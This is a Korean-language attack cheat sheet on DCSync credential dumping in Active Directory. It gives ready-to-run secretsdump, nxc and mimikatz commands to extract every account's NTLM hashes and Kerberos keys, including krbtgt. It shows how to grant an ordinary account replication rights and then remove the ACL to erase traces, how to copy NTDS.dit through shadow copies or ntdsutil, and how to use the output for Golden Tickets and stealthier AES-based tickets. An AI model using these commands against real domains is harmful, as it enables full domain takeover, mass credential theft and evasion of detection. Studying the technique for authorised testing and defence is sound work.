# 05_DCSync

# AD 내부침투 — DCSync

---

## 개념

DCSync는 DC에서 직접 코드를 실행하지 않고 도메인 복제 프로토콜(MS-DRSR, Directory Replication Service Remote Protocol)을 흉내내 원격에서 계정 해시와 Kerberos 키를 추출하는 공격이다. MITRE ATT&CK T1003.006으로 분류된다.

DC들은 서로 데이터를 동기화하기 위해 DRSGetNCChanges(IDL_DRSGetNCChanges) 함수를 사용한다. DCSync는 이 함수를 악용해 DC인 척 복제 요청을 보내고, 실제 DC가 요청에 응답해 해시와 Kerberos 키를 반환하도록 유도한다. 실제 DC 메모리에 접근하거나 NTDS.dit 파일을 직접 복사할 필요가 없다.

impacket-secretsdump는 내부적으로 SMB 연결 후 DRSUAPI를 호출하기 때문에, Kerberos 티켓으로 인증할 때 CIFS/dc.corp.local SPN이 필요하다. mimikatz는 LDAP을 먼저 사용하므로 LDAP/dc.corp.local SPN이 필요하다.

DCSync가 강력한 이유는 DC에 직접 접근하지 않아도 되고, 네트워크 트래픽이 DC 간 정상 복제 트래픽처럼 보여 탐지가 어렵다는 점이다. 또한 모든 계정의 현재 NTLM 해시와 Kerberos 키(AES256 포함)를 한 번에 추출할 수 있다.

---

## 필요 권한

DCSync를 수행하려면 도메인 오브젝트에 복제 권한이 필요하다. Windows에서의 실제 권한명과 BloodHound 엣지 이름이 다르므로 둘 다 알아두어야 한다.

```
Windows 권한명                                      BloodHound 엣지
──────────────────────────────────────────────────────────────────────
Replicating Directory Changes                   →  GetChanges
Replicating Directory Changes All               →  GetChangesAll
Replicating Directory Changes In Filtered Set   →  GetChangesInFilteredSet
```

DCSync를 실행하려면 GetChanges와 GetChangesAll 두 권한이 반드시 모두 있어야 한다. 하나만 있으면 DCSync가 동작하지 않는다. BloodHound에서 둘 중 하나만 표시되는 경우 실제로는 DCSync가 불가능한 상태다.

GetChangesInFilteredSet은 RODC(Read-Only Domain Controller)가 있는 환경에서 필터링된 속성을 복제할 때만 필요하다. 일반 환경에서는 없어도 DCSync가 가능하다.

기본적으로 Domain Admins, Enterprise Admins, DC 컴퓨터 계정만 이 권한을 갖는다. BloodHound에서 GenericAll, WriteDACL 경로를 발견하면 일반 계정에 이 권한을 부여해 DCSync를 실행할 수 있다.

```
기본 보유 그룹:
- Domain Admins
- Enterprise Admins
- DC 컴퓨터 계정 (CORP$)
```

---

## impacket-secretsdump (Linux — 가장 자주 사용)

secretsdump는 DRSUAPI를 통해 도메인의 모든 계정 해시와 Kerberos 키를 원격으로 추출한다. 내부적으로 SMB 연결 후 DRSUAPI를 호출하므로 SMB 포트(445)가 열려있어야 한다. `-just-dc-user`로 특정 계정만 추출하거나 `-just-dc`로 전체 NTDS를 덤프한다. `-outputfile`로 결과를 파일에 저장하면 이후 분석이 편하다.

```bash
# 패스워드로 전체 덤프
# 출력에 NTLM 해시, Kerberos AES 키, 평문 패스워드(WDigest 활성 시) 포함
impacket-secretsdump corp.local/Administrator:'Password1!'@<DC_IP>

# NTLM 해시로 인증 (PtH 상태에서 패스워드 없이 사용)
# -hashes: LM:NTLM 형식으로 입력 (LM은 aad3b435...더미값 사용)
impacket-secretsdump -hashes :<NTLM> corp.local/Administrator@<DC_IP>

# Kerberos 인증 (ccache 있을 때)
# secretsdump는 내부적으로 SMB를 쓰므로 CIFS SPN이 필요
# FQDN으로 접근해야 Kerberos 인증이 정상 동작
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@dc.corp.local

# krbtgt만 추출 (Golden Ticket 생성에 필요)
# krbtgt 해시 + AES256 키가 핵심 — 이것만 있으면 도메인 영구 장악 가능
impacket-secretsdump \
  -just-dc-user krbtgt \
  corp.local/Administrator:'Password1!'@<DC_IP>

# Administrator만 추출
impacket-secretsdump \
  -just-dc-user Administrator \
  corp.local/Administrator:'Password1!'@<DC_IP>

# NTLM 해시만 출력 (Kerberos 키 등 불필요한 정보 제외)
# 출력이 깔끔해져서 다음 단계 진행이 편함
impacket-secretsdump \
  -just-dc-ntlm \
  corp.local/Administrator:'Password1!'@<DC_IP>

# 전체 NTDS 덤프 (모든 계정 해시 포함)
impacket-secretsdump \
  -just-dc \
  corp.local/Administrator:'Password1!'@<DC_IP>

# 결과를 파일로 저장 (파일명.ntds, 파일명.ntds.kerberos 등으로 저장됨)
impacket-secretsdump \
  corp.local/Administrator:'Password1!'@<DC_IP> \
  -outputfile dump

# 특정 계정만 grep으로 필터
impacket-secretsdump \
  corp.local/Administrator:'Password1!'@<DC_IP> \
  | grep -E "krbtgt|Administrator|svc_"

# 파일로 저장 후 grep
impacket-secretsdump \
  corp.local/Administrator:'Password1!'@<DC_IP> \
  | tee secretsdump.txt
grep krbtgt secretsdump.txt
```

---

## nxc

nxc의 `--ntds` 옵션은 내부적으로 secretsdump와 동일한 DRSUAPI 방식으로 동작한다. 추가로 VSS(Volume Shadow Copy) 방식도 지원하는데, VSS는 NTDS.dit 파일을 섀도 복사본으로 복사해 파싱하는 방식이라 DRSUAPI가 차단된 환경에서 우회 가능하다.

```bash
# 기본 DRSUAPI 방식
nxc smb <DC_IP> -u Administrator -p 'Password1!' --ntds

# NTLM 해시로 인증
nxc smb <DC_IP> -u Administrator -H <NTLM> --ntds

# VSS 방식 (Volume Shadow Copy — DRSUAPI 차단 환경에서 우회)
# DC에서 볼륨 섀도 복사본을 생성하고 NTDS.dit를 복사해 파싱
nxc smb <DC_IP> -u Administrator -p 'Password1!' --ntds vss

# DRSUAPI 방식 명시
nxc smb <DC_IP> -u Administrator -p 'Password1!' --ntds drsuapi

# 특정 계정만 grep으로 필터
nxc smb <DC_IP> -u Administrator -p 'Password1!' --ntds 2>/dev/null \
  | grep -E "krbtgt|Administrator"
```

---

## mimikatz (Windows)

mimikatz의 DCSync는 DC에서 직접 실행하거나, DCSync 권한이 있는 다른 머신에서 실행한다. LDAP을 먼저 사용하므로 Kerberos 티켓으로 인증 시 LDAP/dc.corp.local SPN이 필요하다.

```bash
:: 특정 계정 해시 추출
:: /user: 추출할 계정의 sAMAccountName
:: /domain: 도메인 FQDN
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:Administrator

:: 전체 도메인 덤프 (CSV 형식으로 출력)
:: /all: 모든 계정 대상
:: /csv: CSV 형식으로 출력 (파싱하기 편함)
lsadump::dcsync /domain:corp.local /all /csv

:: 특정 DC 지정 (DC가 여러 개일 때)
lsadump::dcsync /domain:corp.local /user:krbtgt /dc:dc01.corp.local
```

---

## DCSync 권한 부여 (GenericAll / WriteDACL 악용)

BloodHound에서 GenericAll 또는 WriteDACL 경로를 발견하면 일반 계정에 DCSync 권한을 부여할 수 있다. 이 권한은 ACL로 설정되므로 재부팅 후에도 유지된다. 권한 부여 후 ACL 제거를 안 하면 Event ID 5136으로 변경 흔적이 남는다.

```powershell
Import-Module .\PowerView.ps1

# DCSync 권한 부여
# -TargetIdentity: 권한을 설정할 도메인 오브젝트 DN
# -PrincipalIdentity: 권한을 받을 계정
# -Rights DCSync: GetChanges + GetChangesAll 동시 부여
Add-DomainObjectAcl `
  -TargetIdentity "DC=corp,DC=local" `
  -PrincipalIdentity john `
  -Rights DCSync `
  -Verbose

# 권한 부여 확인
Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | `
  Where-Object {$_.IdentityReferenceName -eq "john"}

# 권한 부여 후 secretsdump 실행
impacket-secretsdump corp.local/john:'Password1!'@<DC_IP>

# 공격 후 ACL 제거 (흔적 제거)
Remove-DomainObjectAcl `
  -TargetIdentity "DC=corp,DC=local" `
  -PrincipalIdentity john `
  -Rights DCSync `
  -Verbose
```

```bash
# Linux — impacket-dacledit으로 DCSync 권한 부여
# -action write: ACL 쓰기 모드
# -rights DCSync: GetChanges + GetChangesAll 동시 부여
# -principal: 권한을 받을 계정
# -target-dn: 권한을 설정할 도메인 오브젝트 DN
impacket-dacledit corp.local/Administrator:'Password1!' \
  -dc-ip <DC_IP> \
  -action write \
  -rights DCSync \
  -principal john \
  -target-dn "DC=corp,DC=local"

# bloodyAD로도 가능
bloodyAD --host <DC_IP> -d corp.local -u Administrator -p 'Password1!' \
  add dcsync john

# 권한 부여 후 바로 secretsdump 실행
impacket-secretsdump corp.local/john:'Password1!'@<DC_IP>

# 공격 후 ACL 제거
impacket-dacledit corp.local/Administrator:'Password1!' \
  -dc-ip <DC_IP> \
  -action remove \
  -rights DCSync \
  -principal john \
  -target-dn "DC=corp,DC=local"
```

---

## 로컬 NTDS.dit 파싱 (DC에 직접 접근한 경우)

DC에서 NTDS.dit 파일과 레지스트리 하이브를 복사한 뒤 오프라인으로 파싱한다. NTDS.dit는 AD 데이터베이스 파일로 모든 계정 해시가 저장되어 있지만, 실행 중에는 잠겨있어 직접 복사가 불가능하다. Volume Shadow Copy를 사용하면 잠긴 파일도 복사할 수 있다.

```bash
:: Volume Shadow Copy 생성
:: vssadmin: Windows 기본 볼륨 섀도 관리 도구
vssadmin create shadow /for=C:

:: 섀도 복사본 목록 확인 (Shadow Copy Volume 경로 확인)
vssadmin list shadows

:: 섀도 복사본에서 파일 복사
:: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\: 섀도 복사본 경로
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\

:: ntdsutil로 IFM(Install From Media) 생성 (더 간단한 방법)
:: IFM은 DC 승격 시 쓰는 기능이지만 NTDS.dit 추출에도 활용됨
ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q

:: 레지스트리 하이브 저장 (복호화 키 포함)
:: SYSTEM: NTDS.dit 복호화에 필요한 부트 키 포함
reg save HKLM\SYSTEM C:\Temp\system.hive
```

```bash
# 칼리에서 파일 전송 후 오프라인 파싱
# -ntds: NTDS.dit 파일 경로
# -system: SYSTEM 하이브 파일 경로
# LOCAL: 로컬 파일 파싱 모드
impacket-secretsdump \
  -ntds NTDS.dit \
  -system system.hive \
  LOCAL

# 결과를 파일로 저장
impacket-secretsdump \
  -ntds /tmp/NTDS.dit \
  -system /tmp/system.hive \
  -outputfile /tmp/hashes \
  LOCAL
```

---

## 출력 해석

secretsdump 출력에서 각 필드의 의미를 알아야 다음 단계로 이어갈 수 있다.

```
# NTLM 해시 형식
corp.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::
# 필드 설명:
# corp.local\Administrator  → 도메인\계정명
# 500                       → RID (500=Administrator, 501=Guest, 502=krbtgt, 1000+=일반 계정)
# aad3b435b51404eeaad3b435b51404ee → LM 해시 (더미값 — 실제 LM 비활성화됨)
# <NTLM>                    → NTLM 해시 (32자 hex) — PtH 공격에 사용
# :::                       → 추가 속성 (비어있음)

# krbtgt — Golden Ticket 생성에 필요
corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_NTLM>:::

# Kerberos 키 출력 (더 스텔스한 공격에 AES256 사용)
# AES256이 있으면 RC4(NTLM) 대신 AES256으로 티켓 생성 → 탐지 낮음
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:<AES256>
Administrator:aes128-cts-hmac-sha1-96:<AES128>
krbtgt:aes256-cts-hmac-sha1-96:<KRBTGT_AES256>
krbtgt:aes128-cts-hmac-sha1-96:<KRBTGT_AES128>

# 컴퓨터 계정 (Silver Ticket에 사용)
CORP$:1001:aad3b435b51404eeaad3b435b51404ee:<NTLM>:::

# 평문 패스워드 (WDigest 활성 환경에서만 출력)
[*] CORP\john:Password1!
```

---

## 흐름

DA 또는 DCSync 권한 확보 → secretsdump 실행 → krbtgt NTLM + AES256 키 추출 → Administrator 해시 추출 → krbtgt 해시 오프라인 보관(지속성) → Golden Ticket 생성 또는 PtH로 도메인 장악 지속